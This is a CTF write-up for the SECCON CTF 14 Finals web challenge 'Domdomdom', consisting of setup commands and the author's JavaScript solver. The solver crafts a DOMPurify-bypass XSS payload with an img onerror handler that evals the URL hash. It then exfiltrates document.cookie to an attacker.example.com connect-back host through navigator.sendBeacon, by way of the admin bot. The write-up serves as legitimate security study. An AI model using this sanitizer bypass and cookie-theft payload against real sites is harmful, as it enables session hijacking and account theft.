---
title: "Domdomdom - SECCON CTF 14 Finals 2026"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "xss", "eval", "web", "seccon-ctf-14-finals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/domdomdom"
license: "none stated"
ctf:
  name: "SECCON CTF 14 Finals"
  year: 2026
  challenge: "Domdomdom"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/domdomdom>
- **CTF:** SECCON CTF 14 Finals 2026

---

# [web] DOMDOMDOMPurify

## Description

DOM DOM DOM

- Challenge: `http://domdomdom.{int,dom}.seccon.games:3000`
- Admin bot: `http://domdomdom.{int,dom}.seccon.games:1337`

## Attachments

- [domdomdom](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/domdomdom/solution/index.js>

```javascript
import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const x = `<style><{Y}/style> <{Z}img src onerror=eval(decodeURIComponent(location.hash.slice(1)))></style>`;

// ref. https://github.com/cure53/DOMPurify/blob/3.3.1/src/purify.ts#L1080-L1090
const y = `&lt;a<!--`;
const z = `&lt;a<!--`;

const xss = `navigator.sendBeacon("${CONNECTBACK_URL}/flag", document.cookie)`;
const url = `http://web:3000?${new URLSearchParams({ x, y, z })}#${encodeURIComponent(xss)}`;

app.post("/flag", async (req, reply) => {
  // You got a flag!
  const flag = req.body;
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);
  await reportUrl(url);
  assert.fail("Failed");
});
```
